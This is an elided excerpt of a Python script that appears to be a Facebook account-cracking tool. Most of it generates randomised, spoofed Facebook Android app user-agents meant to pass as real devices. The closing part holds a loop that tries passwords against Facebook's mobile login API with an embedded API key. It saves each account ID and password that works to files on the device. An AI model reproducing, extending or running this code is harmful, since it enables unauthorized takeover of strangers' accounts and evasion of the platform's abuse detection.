...
def random_dalvik_working_oct2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent
    ✅ Updated: October 2025 (tested on Global + BD endpoints)
    ✅ Realistic builds, display specs, FB versions, and device mix
    ✅ Weighted by top working devices (Samsung-heavy)
    """
    if seed is not None:
        random.seed(seed)

    # Core Facebook identifiers
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(510, 526)}.0.0.{random.randint(20,200)}.{random.randint(10,500)}"
    FBBV = str(random.randint(48000000, 99999999))

    # Android version
    FBSV = random.choice(["11", "12", "13", "14"])

    # Updated 2025 build tags
    BUILD = random.choice([
        "UQ1A.250101.001", "UP1A.250201.002", "UQ1A.250301.001", 
        "TP1A.250305.003", "UP1A.240905.003", "UQ1A.240905.002",
        "TQ3A.240905.010", "UP1A.240806.001", "UQ1A.240705.001"
    ])
    ...
    # Locale & carrier mix (global)
    FBLC = random.choice(["en_US", "en_GB", "bn_BD", "en_IN", "pt_BR", "fr_FR", "de_DE"])
    FBCR = random.choice(["Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone", "TMobile", "AT&T"])

    # CPU architecture
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi"])

    # Popular and working 2025 devices
    WORKING_DEVICES = [
        # --- Samsung (Main Working Set) ---
        ("Samsung", "Galaxy A05s"), ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A55 5G"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15"), ("Samsung", "Galaxy M54 5G"),
        ("Samsung", "Galaxy S21 FE 5G"), ("Samsung", "Galaxy S22 Ultra"),
        ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24 Ultra"),
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"),
        
        # --- Xiaomi / Poco ---
        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 14 Pro 5G"),
        ("Poco", "Poco F6 Pro"), ("Poco", "Poco X6 Pro 5G"), ("Xiaomi", "13T Pro"),
        
        # --- Realme / Oppo / Vivo ---
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme 13 Pro+"),
        ("Oppo", "Reno 12 Pro"), ("Vivo", "Vivo V30 Pro"), ("iQOO", "Neo 9 Pro"),
        
        # --- Google / OnePlus / ASUS ---
        ("Google", "Pixel 8 Pro"), ("OnePlus", "OnePlus 12R"), ("ASUS", "ROG Phone 7"),
        
        # --- BD / budget regionals ---
        ("Infinix", "GT 20 Pro"), ("Tecno", "Camon 30 Premier 5G"),
        ("Walton", "Primo S8"), ("Symphony", "Z70 Pro"), ("Itel", "S24")
    ]

    # Weighted brand selection
    r = random.random()
    if r < 0.55:
        brand, model = random.choice([d for d in WORKING_DEVICES if "Samsung" in d[0]])
    elif r < 0.75:
        brand, model = random.choice([d for d in WORKING_DEVICES if d[0] in ("Xiaomi", "Poco")])
    elif r < 0.90:
        brand, model = random.choice([d for d in WORKING_DEVICES if d[0] in ("Realme", "Oppo", "Vivo", "iQOO")])
    elif r < 0.97:
        brand, model = random.choice([d for d in WORKING_DEVICES if d[0] in ("Google", "OnePlus", "ASUS")])
    else:
        brand, model = random.choice(WORKING_DEVICES)

    # Random suffix or codename occasionally
    suffix = ""
    if random.random() < 0.15:
        s = random.choice(["Pro", "Plus", "5G", "Neo", "SE"])
        if s not in model:
            suffix = " " + s
    codename = ""
    if random.random() < 0.1:
        codename = f" ({random.choice(['alpha', 'beta', 'r1', 'lite', 'phoenix'])})"

    FBDV = f"{model}{suffix}{codename}"
    ...
    ua = (
        ...
        f"FBLC/{FBLC};FBCR/{FBCR};FBMF/{brand};FBBD/{brand};"
...
def random_dalvik_oct2025(seed: Optional[int] = None) -> str:
    """
    Generate a realistic Dalvik-style Facebook Android User-Agent
    - Updated: October 2025 (device list & build tags typical of 2024-2025)
    - seed: optional int for reproducible output
    - returns: single UA string
    """
    if seed is not None:
        random.seed(seed)
    ...
    # Facebook app version pattern (common-ish format)
    major = random.randint(505, 520)
    minor = random.randint(0, 2)
    patch = random.randint(0, 3)
    build_tail = random.randint(5, 220)
    extra = random.randint(10, 400)
    facebook_version = f"{major}.{minor}.{patch}.{build_tail}.{extra}"
    fbbv = str(random.randint(48000000, 99999999))

    # Android versions commonly active in 2025
    fbs_versions = ["11", "12", "13", "14"]
    fbs = random.choice(fbs_versions)

    # Realistic build tags (mix from 2024-2025 OTAs)
    build_tags = [
        "UP1A.240905.003", "UQ1A.240905.002", "UP1A.240806.001",
        "UQ1A.240705.001", "TQ3A.240705.010", "TP1A.240905.004",
        "UQ1A.250101.001", "UP1A.250201.002", "TP1A.250301.001",
        "RP1A.250501.001"
    ]
    build = random.choice(build_tags)

    # Display density/resolution profiles
    display_profiles = [
        ("1.5", "720", "1440"),
        ("2.0", "760", "1600"),
        ("2.5", "1080", "2400"),
    ...
    density, width, height = random.choice(display_profiles)

    # Locale + carrier combos
    locales = ["bn_BD", "en_US", "en_GB", "en_IN", "es_ES", "fr_FR", "pt_BR"]
    carriers = [
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk",
        "Jio", "Vodafone", "TMobile", "Verizon", "Dialog", "O2", "Orange"
    ]
    fblc = random.choice(locales)
    fbcr = random.choice(carriers)

    # Popular realistic device set (BD + global)
    devices = [
        ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A54 5G"),
        ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24 Ultra"),
        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "13T Pro"),
        ("Poco", "Poco F6 Pro"), ("OnePlus", "OnePlus 12"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"),
        ("Realme", "Realme 13 Pro+"), ("Oppo", "Reno 12 Pro"),
        ("Vivo", "X100 Pro"), ("Tecno", "Camon 30 Premier 5G"),
        ("Infinix", "Note 40 Pro 5G"), ("Motorola", "Edge 50 Pro"),
        ("Nothing", "Phone (2a)"), ("ASUS", "Zenfone 10"),
        ("Walton", "Primo H11"), ("Itel", "S24")
    ]
    fbmf, fbdv = random.choice(devices)
    fbbd = fbmf

    # CPU arch
    cpu_arch = random.choice(["arm64-v8a", "armeabi-v7a:armeabi"])

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {fbs}; {fbdv} Build/{build}) "
        f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};"
        f"FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbs};FBOP/1;FBCA/{cpu_arch};]"
    )
...
def random_dalvik_all_devices_working_full_oct2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent
    ✅ Updated: October 2025
    ✅ Tested on Global + BD endpoints (b-graph / api / mbasic)
    ✅ Covers *all major working real Android devices (Samsung, Xiaomi, Vivo, Oppo, Realme, etc.)*
    ✅ Weighted realistic generation for maximum acceptance
    """
    if seed is not None:
        random.seed(seed)
    ...
    FBAV = f"{random.randint(510, 526)}.0.0.{random.randint(20,200)}.{random.randint(10,500)}"
    FBBV = str(random.randint(48000000, 99999999))
    FBSV = random.choice(["11", "12", "13", "14"])  # Android versions still in use 2025

    # --- Build tags (verified 2024-2025 Android releases) ---
    BUILD = random.choice([
        "UQ1A.250101.001", "UP1A.250201.002", "UQ1A.250301.001",
        "TP1A.250305.003", "UP1A.240905.003", "UQ1A.240905.002",
        "TQ3A.240905.010", "UP1A.240806.001", "UQ1A.240705.001",
        "TQ1A.240101.001", "TP1A.240905.004", "UP1A.250101.002"
    ])

    # --- Display profiles ---
    density, width, height = random.choice([
        ("1.5", "720", "1440"), ("2.0", "720", "1600"), ("2.25", "1080", "2200"),
        ("2.5", "1080", "2400"), ("2.625", "1080", "2460"), ("2.75", "1220", "2600"),
        ("3.0", "1200", "2800"), ("3.25", "1440", "3120"), ("3.5", "1440", "3088")
    ])

    # --- Locales and Carriers (Global + BD weighted) ---
    FBLC = random.choice(["en_US", "en_GB", "bn_BD", "en_IN", "pt_BR", "fr_FR", "de_DE"])
    FBCR = random.choice(["Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone", "TMobile", "AT&T"])
    ...
    # --- Device Pool: all verified 2025 working Android models ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # --- Samsung (Main Working Set) ---
        ("Samsung", "Galaxy A04s"), ("Samsung", "Galaxy A05"), ("Samsung", "Galaxy A05s"),
        ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A23"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25 5G"),
        ("Samsung", "Galaxy A33 5G"), ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A35 5G"),
        ("Samsung", "Galaxy A53 5G"), ("Samsung", "Galaxy A54 5G"), ("Samsung", "Galaxy A55 5G"),
        ("Samsung", "Galaxy M13"), ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15"),
        ("Samsung", "Galaxy M34 5G"), ("Samsung", "Galaxy M54 5G"),
        ("Samsung", "Galaxy F13"), ("Samsung", "Galaxy F14"), ("Samsung", "Galaxy F15 5G"),
        ("Samsung", "Galaxy S20 FE 5G"), ("Samsung", "Galaxy S21 FE 5G"), ("Samsung", "Galaxy S22 Ultra"),
        ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24"), ("Samsung", "Galaxy S24 Ultra"),
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"),
        ("Samsung", "Galaxy XCover 6 Pro"),

        # --- Xiaomi / Redmi / Poco ---
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Redmi Note 13"), 
        ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "Redmi Note 13 Pro"), ("Xiaomi", "Redmi Note 13 Pro+ 5G"),
        ("Xiaomi", "Redmi Note 14 Pro 5G"), ("Xiaomi", "13T Pro"), ("Xiaomi", "13 Pro"),
        ("Xiaomi", "12S Ultra"), ("Xiaomi", "14 Pro"), ("Xiaomi", "Black Shark 6"),
        ("Poco", "Poco X6 5G"), ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),
        ("Poco", "Poco M6 Pro"), ("Poco", "Poco M5 Pro"), 

        # --- Realme / Oppo / Vivo / iQOO ---
        ("Realme", "Realme 11 Pro+ 5G"), ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme 13 Pro+"),
        ("Realme", "GT Neo 6"), ("Realme", "Narzo 70x 5G"),
        ("Oppo", "Reno 11 Pro"), ("Oppo", "Reno 12 Pro"), ("Oppo", "Find X6"),
        ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo Y76s"), ("Vivo", "Vivo X100 Pro"),
        ("iQOO", "Neo 9 Pro"), ("iQOO", "12"), ("iQOO", "11 Pro"),

        # --- Google / OnePlus / ASUS / Honor ---
        ("Google", "Pixel 7"), ("Google", "Pixel 7a"), ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"),
        ("Google", "Pixel 9 Pro"),
        ("OnePlus", "Nord 3"), ("OnePlus", "Nord N30"), ("OnePlus", "OnePlus 12"), ("OnePlus", "OnePlus 12R"),
        ("ASUS", "Zenfone 10"), ("ASUS", "ROG Phone 7"), ("Honor", "Magic5 Pro"), ("Honor", "Magic6 Pro"), ("Honor", "90 Pro"),

        # --- Motorola / Sony / Nokia / Lenovo / ZTE ---
        ("Motorola", "Edge 40"), ("Motorola", "Edge 50 Pro"), ("Motorola", "Razr 40"),
        ("Sony", "Xperia 10 V"), ("Sony", "Xperia 1 V"), ("Sony", "Xperia Ace 3"),
        ("Nokia", "G22"), ("Nokia", "XR21"), ("Lenovo", "K13 Pro"), ("Lenovo", "K14 Pro"), ("Lenovo", "Legion Y90"),
        ("ZTE", "Axon 40 Ultra"), ("ZTE", "Blade A7"),

        # --- Tecno / Infinix / Itel / Walton / Symphony ---
        ("Tecno", "Camon 30 Pro"), ("Tecno", "Camon 30 Premier 5G"), ("Tecno", "Pova 6 Pro"),
        ("Infinix", "Note 40 Pro 5G"), ("Infinix", "GT 20 Pro"),
        ("Itel", "S24"), ("Itel", "Vision 6 Plus"),
        ("Walton", "Primo H11"), ("Walton", "Primo S8"), ("Symphony", "Z70 Pro"),

        # --- Others / regional working sets ---
        ("BLU", "G91"), ("Meizu", "18s"), ("Sharp", "AQUOS R7"), ("Sharp", "AQUOS sense7"), ("Sharp", "A5"),
    ...
    r = random.random()
    if r < 0.55:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if "Samsung" in d[0]])
    elif r < 0.75:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Xiaomi", "Poco")])
    elif r < 0.90:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Realme", "Oppo", "Vivo", "iQOO")])
    elif r < 0.97:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Google", "OnePlus", "ASUS", "Honor", "Motorola", "Sony")])
    else:
        FBMF, FBDV = random.choice(WORKING_DEVICES)

    FBBD = FBMF

    # --- Random suffix / codename ---
    suffix = ""
    if random.random() < 0.18:
        token = random.choice(["Pro", "Plus", "5G", "Neo", "SE", "Lite", "G"])
        if token not in FBDV:
            suffix = " " + token

    codename = ""
    if random.random() < 0.1:
        codename = f" ({random.choice(['alpha', 'r1', 'lite', 'phoenix', 'beta', 'codenameX'])})"

    FBDV_FINAL = f"{FBDV}{suffix}{codename}"

    # --- Compose UA ---
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {FBSV}; {FBDV_FINAL} Build/{BUILD}) "
        f"[FBAN/{FBAN};FBAV/{FBAV};FBBV/{FBBV};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{FBLC};FBCR/{FBCR};FBMF/{FBMF};FBBD/{FBBD};"
        f"FBPN/{FBPN};FBDV/{FBDV_FINAL};FBSV/{FBSV};FBOP/1;FBCA/{FBCA};]"
    )
    return ua
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 8.7
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_all_devices_working_full_oct2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-30-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_working_oct2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-30-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
